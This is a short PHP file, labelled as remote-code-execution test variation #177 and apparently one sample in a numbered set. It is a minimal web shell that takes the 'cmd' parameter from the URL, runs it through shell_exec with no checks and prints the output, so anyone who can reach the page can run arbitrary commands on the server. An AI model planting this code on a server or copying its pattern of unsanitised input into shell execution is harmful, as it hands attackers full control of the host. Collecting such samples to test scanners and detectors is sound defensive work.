<?php
// RCE test variation #177
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>